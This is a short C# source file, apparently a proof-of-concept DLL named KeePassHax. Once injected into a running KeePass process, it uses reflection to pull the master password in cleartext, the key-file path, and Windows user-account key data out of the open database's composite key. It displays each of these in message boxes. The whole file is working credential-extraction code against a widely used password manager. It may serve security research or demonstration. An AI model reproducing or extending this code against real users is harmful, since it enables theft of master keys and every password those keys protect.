using System;
using System.Collections;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

namespace KeePassHax
{
    public static class Program
    {
        /// <summary> A method that is friendly to injectors. </summary>
        public static int Main(string args)
        {
            RealMain();
            return 0;
        }

        /// <summary> A method that is friendly to injectors. </summary>
        public static void Main(string[] args)
        {
            RealMain();
        }

        /// <summary> The real main method. </summary>
        private static void RealMain()
        {
            // Announce ourself to the user because stealth is overrated
            MessageBox.Show("Loading from injected DLL!", "Test");

            // Try to get the entry assembly, and find the Program class
            var asm = Assembly.GetEntryAssembly();
            var programType = asm.EntryPoint.DeclaringType;

            // Get the main form
            var mainForm = programType.GetFieldStatic("m_formMain");

            // Go down the rabbit hole to find more stuff
            var docMgr = mainForm.GetFieldInstance("m_docMgr");
            var dsActive = docMgr.GetFieldInstance("m_dsActive");
            var db = dsActive.GetFieldInstance("m_pwDb");
            var compositeKey = db.GetFieldInstance("m_pwUserKey");

            // Get all items that make up the CompositeKey
            var userKeys = (IList)compositeKey.GetFieldInstance("m_vUserKeys");
            foreach (var key in userKeys) {
                // Do something different depending on what kind of user key we get
                switch (key.GetType().Name) {
                    case "KcpPassword":
                        // Read the m_psPassword field, which is a ProtectedString
                        var passProt = key.GetFieldInstance("m_psPassword");

                        // Invoke the ReadString function, which returns a plaintext string
                        var cleartext = (string)passProt.RunMethodInstance("ReadString");
                        MessageBox.Show("Extracted password:\n" + cleartext, key.GetType().Name);
                        break;
                    case "KcpKeyFile":
                        // Read the m_strPath field, which contains the path to the keyfile
                        // We could also read m_pbKeyData which is a ProtectedBinary, but that's slightly more effort :)
                        var keyPath = key.GetFieldInstance("m_strPath");
                        MessageBox.Show("KeyFile path:\n" + keyPath, key.GetType().Name);
                        break;
                    case "KcpUserAccount":
                        // So technically, we don't even need to extract this one from the current process, since it's accessible by any program 
                        // running in this user's context. But just for good measure (and to keep code simple), I'll extract this from memory too.
                        var userAccData = key.GetFieldInstance("m_pbKeyData");
                        var userAccDataClear = (byte[])userAccData.RunMethodInstance("ReadData");
                        MessageBox.Show("Extracted UserAccount data:\n" + string.Join("-", userAccDataClear.Select(x => x.ToString("X2"))), key.GetType().Name);
                        break;
                }
            }
        }

        // Some extension methods
        private static object GetFieldInstance(this object o, string name) => o.GetType().GetField(name, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance)?.GetValue(o);
        private static object GetFieldStatic(this IReflect t, string name) => t.GetField(name, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static)?.GetValue(null);
        private static object RunMethodInstance(this object o, string name, params object[] p) => o.GetType().GetMethod(name, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance)?.Invoke(o, p);
    }
}
